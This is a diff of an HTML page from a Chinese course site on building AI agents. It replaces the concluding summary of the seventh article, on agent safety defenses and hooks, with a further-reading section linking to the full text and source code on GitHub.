-<td><strong>能力越大，防线越重要</strong></td>
-</tr>
-</tbody>
-</table></div>
-<p>前六篇回答&quot;Agent 能做什么&quot;，第七篇回答&quot;Agent 不能做什么&quot;。能力和约束是一体两面。</p>
-<p>如果把 Agent 比作一辆车：</p>
-<ul>
-<li>第一篇装了<strong>引擎</strong>（工具 + 循环）</li>
-<li>第二篇装了<strong>后视镜和导航</strong>（记忆 + 规划）</li>
-<li>第三篇装了<strong>可换配件和使用手册</strong>（Rules + Skills + MCP）</li>
-<li>第四篇让它<strong>能叫外援</strong>（SubAgent）</li>
-<li>第五篇让它<strong>组建车队</strong>（Teams）</li>
-<li>第六篇装了<strong>油量警告灯</strong>（上下文压缩）</li>
-<li>第七篇装了<strong>刹车和安全气囊</strong>（安全防线 + Hook）</li>
-</ul>
-<p>七篇下来，这辆车从底盘到安全系统都齐了。把 OpenClaw 或 Claude Code 拆开看，里面就是这些东西——每一样单独拿出来都不复杂，组合在一起就构成了一个能自主工作的智能体。</p>
-<p>写这个系列的初衷很简单：Agent 不应该是少数人的黑魔法，它的每一个核心概念都可以用几十行代码讲清楚。希望这七篇文章能帮你拨开迷雾，在 Agent 的世界里走得更踏实一些。</p>
-<hr>
-<p><em>本文基于 agent-safe.py（<a href="https://github.com/GitHubxsy/nanoAgent/blob/main/agent/07-safety/agent-safe.py">GitHub 源码</a>）分析。完整系列：<a href="essence.html">第一篇</a> → <a href="memory.html">第二篇</a> → <a href="skills-mcp.html">第三篇</a> → <a href="subagent.html">第四篇</a> → <a href="teams.html">第五篇</a> → <a href="compact.html">第六篇</a> → 第七篇（本文）</em></p>
+        <section class="lesson-section" id="extend">
+          <div class="lesson-section-head">
+            <p class="eyebrow">After Class</p>
+            <h2>课后延伸</h2>
+            <p>课堂里不展示全文，课后再补完整文章和源码细节。</p>
+          </div>
+          <div class="deep-links">
+            <a class="secondary-btn" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">读完整原文</a>
+            <a class="secondary-btn" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.py">看完整代码</a>
+          </div>
         </section>
 
         <nav class="pager">
-          <a class="pager-link prev" href="compact.html"><span>上一篇</span><strong>06. 压缩</strong></a>
+          <a class="pager-link" href="compact.html"><span>上一篇</span><strong>06. 长任务生存</strong></a>
           
         </nav>
       </article>
     </main>
     
     <footer class="site-footer">
-      <p>内容基于 nanoAgent 的前七篇文章重组，适配为课程型教学网站。</p>
+      <p>课堂版页面只保留 1 小时分享最需要的实战内容，完整原文与源码请看 GitHub。</p>
       <div class="footer-links">
         <a href="https://github.com/GitHubxsy/nanoAgent">GitHub 仓库</a>
         <a href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/README_CN.md">系列导读</a>
